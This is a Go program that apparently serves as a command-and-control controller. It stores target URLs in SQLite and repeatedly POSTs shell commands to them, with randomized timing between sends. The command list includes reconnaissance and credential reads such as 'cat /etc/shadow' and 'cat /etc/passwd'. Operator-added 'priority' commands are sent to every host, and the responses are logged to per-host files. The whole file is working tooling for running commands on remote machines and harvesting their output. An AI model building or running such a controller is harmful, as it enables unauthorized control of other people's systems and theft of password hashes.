package main

import (
	"database/sql"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

var (
	dbPath      = "./urls.db"
	commandList = []string{
		"ls -la",
		"pwd",
		"whoami",
		"date",
		"uptime",
		"hostname",
		"df -h",
		"free -m",
		"ifconfig",
		"netstat -tuln",
		"iptables -L",
		"ps aux",
		"top -b -n1",
		"cat /etc/os-release",
		"uname -a",
		"curl ifconfig.me",
		"traceroute google.com",
		"ping -c 4 8.8.8.8",
		"cat /etc/passwd",
		"cat /etc/shadow",
		"history",
		"who",
		"last",
		"service --status-all",
		"systemctl list-units --type=service",
	}
)

func getURLs(db *sql.DB) ([]string, error) {
	rows, err := db.Query("SELECT url FROM urls")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var urls []string
	for rows.Next() {
		var url string
		if err := rows.Scan(&url); err != nil {
			return nil, err
		}
		urls = append(urls, url)
	}
	return urls, nil
}

func sendRandomElement(url string) error {
	element := commandList[rand.Intn(len(commandList))]
	resp, err := http.Post(url, "text/plain", strings.NewReader(element))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

func sendPriorityCommand(url, command string) string {
	resp, err := http.Post(url, "text/plain", strings.NewReader(command))
	if err != nil {
		return "Error: " + err.Error()
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "Error: " + err.Error()
	}
	return string(body)
}

func initDB() {
	if _, err := os.Stat(dbPath); os.IsNotExist(err) {
		db, err := sql.Open("sqlite3", dbPath)
		if err != nil {
			log.Fatalf("Failed to create DB: %v", err)
		}
		defer db.Close()

		_, err = db.Exec(`CREATE TABLE IF NOT EXISTS urls (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			url TEXT NOT NULL UNIQUE
		);`)
		if err != nil {
			log.Fatalf("Failed to create table: %v", err)
		}

		_, err = db.Exec(`CREATE TABLE IF NOT EXISTS priority_commands (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			command TEXT NOT NULL
		);`)
	}
}

func main() {

	if len(os.Args) >= 3 {
		action := os.Args[1]
		url := os.Args[2]

		initDB()

		db, err := sql.Open("sqlite3", dbPath)
		if err != nil {
			log.Fatalf("Failed to open DB: %v", err)
		}
		defer db.Close()

		switch action {
		case "add":
			_, err := db.Exec("INSERT INTO urls(url) VALUES(?)", url)
			if err != nil {
				log.Fatalf("Failed to add URL: %v", err)
			}
			log.Printf("Added URL: %s", url)
			return
		case "delete":
			_, err := db.Exec("DELETE FROM urls WHERE url = ?", url)
			if err != nil {
				log.Fatalf("Failed to delete URL: %v", err)
			}
			log.Printf("Deleted URL: %s", url)
			return
		case "add-priority":
			_, err := db.Exec("INSERT INTO priority_commands(command) VALUES(?)", url)
			if err != nil {
				log.Fatalf("Failed to add priority command: %v", err)
			}
			log.Printf("Added priority command: %s", url)
			return
		case "delete-priority":
			_, err := db.Exec("DELETE FROM priority_commands WHERE command = ?", url)
			if err != nil {
				log.Fatalf("Failed to delete priority command: %v", err)
			}
			log.Printf("Deleted priority command: %s", url)
			return
		default:
			log.Fatalf("Unknown action: %s. Use add, delete, add-priority, or delete-priority.", action)
		}
	}

	db, err := sql.Open("sqlite3", dbPath)
	if err != nil {
		log.Fatalf("Failed to open DB: %v", err)
	}
	defer db.Close()

	for {
		urls, err := getURLs(db)
		if err != nil {
			log.Printf("Error fetching URLs: %v", err)
			time.Sleep(5 * time.Second)
			continue
		}

		// Check for priority commands
		rows, err := db.Query("SELECT command FROM priority_commands")
		if err != nil {
			log.Printf("Error fetching priority commands: %v", err)
		} else {
			defer rows.Close()
			var priorityCommands []string
			for rows.Next() {
				var cmd string
				if err := rows.Scan(&cmd); err == nil {
					priorityCommands = append(priorityCommands, cmd)
				}
			}

			// If there are priority commands, use them first
			if len(priorityCommands) > 0 {
				for _, cmd := range priorityCommands {
					for _, url := range urls {
						output := sendPriorityCommand(url, cmd)
						log.Printf("Sent priority command to %s: %s", url, output)
						// append the output to a log file, named <ip>_<port>_priority.log
						outputFile := fmt.Sprintf("%s_%s_priority.log", strings.Split(strings.Split(url, ":")[0], "/")[2], strings.Split(strings.Split(url, ":")[2], "/")[0])
						f, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
						if err != nil {
							log.Printf("Error opening log file: %v", err)
							continue
						}
						if _, err := f.WriteString(output + "\n"); err != nil {
							log.Printf("Error writing to log file: %v", err)
						}
						f.Close()
					}
				}
			}
		}

		for _, url := range urls {
			if err := sendRandomElement(url); err != nil {
				log.Printf("Error sending to %s: %v", url, err)
			}
			// Sleep 5 ±2 seconds
			sleepDuration := time.Duration(5+rand.Intn(5)-2) * time.Second
			time.Sleep(sleepDuration)
		}
	}
}
